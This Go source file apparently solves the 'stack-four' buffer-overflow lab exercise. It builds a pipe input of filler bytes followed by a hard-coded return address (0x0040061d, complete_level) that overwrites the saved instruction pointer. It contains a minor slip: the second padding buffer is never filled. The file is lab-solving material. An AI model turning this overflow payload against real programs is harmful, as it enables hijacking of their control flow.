package main

type stack4 struct {
}

func (s stack4) get_lesson_name() string {
	return "stack-four"
}

func (s stack4) get_input_method() int {
	return inputPipe
}

func (s stack4) get_environment_key() string { return "" }

func (s stack4) get_input_data() []byte {
	/*
		I think I need to go from ESP (stack pointer/data) all the way to EIP.
	*/

	initialBuffer := make([]byte, 64)
	fill_byte_array(initialBuffer, '\xFF')

	extraBufferUntilEIP := make([]byte, 24)
	fill_byte_array(initialBuffer, '\xFF')

	/*
		Memory address found in the objdump:
		0040061d <complete_level>
	*/
	EIP := []byte("\x1d\x06\x40\x00")

	password := append(initialBuffer[:], extraBufferUntilEIP[:]...)
	password = append(password, EIP[:]...)

	return password
}
